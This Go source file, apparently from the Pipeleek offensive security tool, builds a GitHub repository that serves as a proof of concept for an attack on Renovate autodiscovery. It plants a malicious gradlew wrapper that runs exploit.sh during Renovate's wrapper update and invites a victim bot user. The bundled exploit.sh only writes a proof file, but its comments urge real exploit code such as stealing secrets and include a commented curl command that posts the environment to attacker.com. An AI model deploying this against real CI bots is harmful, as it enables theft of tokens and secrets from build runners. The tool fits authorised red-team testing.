package renovate

import (
	"context"
	"time"

	"github.com/CompassSecurity/pipeleek/pkg/format"
	"github.com/google/go-github/v69/github"
	"github.com/rs/zerolog/log"
)

var renovateJson = `
{
    "$schema": "https://docs.renovatebot.com/renovate-schema.json",
    "extends": [
       "config:recommended"
    ]
}
`

var buildGradle = `
plugins {
    id 'java'
}

repositories {
    mavenCentral()
}

dependencies {
    implementation 'com.google.guava:guava:31.0-jre'
}
`

var gradlewScript = `#!/bin/sh
# Malicious Gradle wrapper script that executes during Renovate's artifact update phase
# This runs when Renovate detects a Gradle wrapper update

# Execute exploit
sh exploit.sh

# Continue with a fake gradle command to avoid errors
echo "Gradle wrapper executed"
exit 0
`

var gradleWrapperProperties = `distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-7.0-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
`

var exploitScript = `#!/bin/sh
# Create a proof file to verify execution
echo "Exploit executed at $(date)" > /tmp/pipeleek-exploit-executed.txt
echo "Working directory: $(pwd)" >> /tmp/pipeleek-exploit-executed.txt
echo "User: $(whoami)" >> /tmp/pipeleek-exploit-executed.txt

echo "Exploit executed during Renovate autodiscovery"
echo "Replace this with your actual exploit code"
echo "Examples:"
echo "  - Exfiltrate environment variables"
echo "  - Read GitHub Actions secrets"
echo "  - Access secrets from the runner"

# Example: Exfiltrate environment to attacker server
# curl -X POST https://attacker.com/collect -d "$(env)"
`

var githubWorkflowYml = `
# GitHub Actions workflow that runs Renovate Bot for debugging
# This verifies the exploit actually executes during Gradle wrapper update
#
# Setup instructions:
# 1. Go to Repository Settings > Secrets and variables > Actions
# 2. Create a new repository secret: RENOVATE_TOKEN = <your-PAT-with-repo-scope>
# 3. The PAT needs 'repo' scope for private repos or 'public_repo' for public repos
# 4. Run the workflow and check the job output for exploit execution proof

name: Renovate Debugging

on:
  workflow_dispatch:
  push:
    branches:
      - main

jobs:
  renovate-debugging:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      
      - name: Run Renovate
        uses: renovatebot/github-action@v40.3.10
        with:
          token: ${{ secrets.RENOVATE_TOKEN }}
        env:
          LOG_LEVEL: debug
      
      - name: Check if exploit executed
        run: |
          echo "=== Checking if exploit executed ==="
          if [ -f /tmp/pipeleek-exploit-executed.txt ]; then
            echo "SUCCESS: Exploit was executed!"
            echo "=== Exploit proof file contents ==="
            cat /tmp/pipeleek-exploit-executed.txt
            cp /tmp/pipeleek-exploit-executed.txt exploit-proof.txt
          else
            echo "FAILED: /tmp/pipeleek-exploit-executed.txt not found"
            echo "Checking /tmp for any proof files..."
            ls -la /tmp/pipeleek-* 2>/dev/null || echo "No proof files found in /tmp"
          fi
      
      - name: Upload proof
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: exploit-proof
          path: exploit-proof.txt
          retention-days: 1
`

// RunGenerate creates a GitHub repository with Renovate autodiscovery exploit PoC.
func RunGenerate(client *github.Client, repoName, username string, addRenovateWorkflow bool) {
	ctx := context.Background()

	if repoName == "" {
		repoName = format.RandomStringN(5) + "-pipeleek-renovate-autodiscovery-poc"
	}

	// Create repository
	repo := &github.Repository{
		Name:        github.String(repoName),
		Description: github.String("Pipeleek Renovate Autodiscovery PoC"),
		Private:     github.Bool(false),
	}

	createdRepo, _, err := client.Repositories.Create(ctx, "", repo)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating repository")
	}
	log.Info().Str("name", createdRepo.GetName()).Str("url", createdRepo.GetHTMLURL()).Msg("Created repository")

	// Wait a bit for repository to be fully initialized
	time.Sleep(2 * time.Second)

	// Create files
	createFile(ctx, client, createdRepo, "renovate.json", renovateJson)
	createFile(ctx, client, createdRepo, "build.gradle", buildGradle)
	createFile(ctx, client, createdRepo, "gradlew", gradlewScript)
	createFile(ctx, client, createdRepo, "gradle/wrapper/gradle-wrapper.properties", gradleWrapperProperties)
	createFile(ctx, client, createdRepo, "exploit.sh", exploitScript)

	if addRenovateWorkflow {
		createFile(ctx, client, createdRepo, ".github/workflows/renovate.yml", githubWorkflowYml)
		log.Info().Msg("Created .github/workflows/renovate.yml for local Renovate testing")
		log.Warn().Msg("IMPORTANT: Add a repository secret named RENOVATE_TOKEN with a PAT that has 'repo' scope")
		log.Info().Msg("Then trigger the workflow manually or push to main, check the job output for 'SUCCESS: Exploit was executed!'")
	}

	if username == "" {
		log.Warn().Msg("No username provided, you must invite the victim Renovate Bot user manually to the created repository")
		log.Info().Msg("Go to: " + createdRepo.GetHTMLURL() + "/settings/access")
	} else {
		invite(ctx, client, createdRepo, username)
	}

	log.Info().Msg("This exploit works by using an outdated Gradle wrapper version (7.0) that triggers Renovate to run './gradlew wrapper'")
	log.Info().Msg("When Renovate updates the wrapper, it executes our malicious gradlew script which runs exploit.sh")
	log.Info().Msg("Make sure to update the exploit.sh script with the actual exploit code")
	log.Info().Msg("Then wait until the created repository is renovated by the invited Renovate Bot user")
}

func invite(ctx context.Context, client *github.Client, repo *github.Repository, username string) {
	log.Info().Str("user", username).Msg("Inviting user to repository")

	owner := repo.GetOwner().GetLogin()
	repoName := repo.GetName()

	// Add collaborator with write permission
	_, _, err := client.Repositories.AddCollaborator(ctx, owner, repoName, username, &github.RepositoryAddCollaboratorOptions{
		Permission: "write",
	})

	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed inviting user to repository, do it manually")
	}

	log.Info().Str("user", username).Msg("Successfully invited user to repository")
}

func createFile(ctx context.Context, client *github.Client, repo *github.Repository, filePath string, content string) {
	owner := repo.GetOwner().GetLogin()
	repoName := repo.GetName()

	opts := &github.RepositoryContentFileOptions{
		Message: github.String("Pipeleek create " + filePath),
		Content: []byte(content),
		Branch:  github.String("main"),
	}

	_, _, err := client.Repositories.CreateFile(ctx, owner, repoName, filePath, opts)
	if err != nil {
		log.Fatal().Stack().Err(err).Str("fileName", filePath).Msg("Creating file failed")
	}

	log.Debug().Str("file", filePath).Msg("Created file")
}
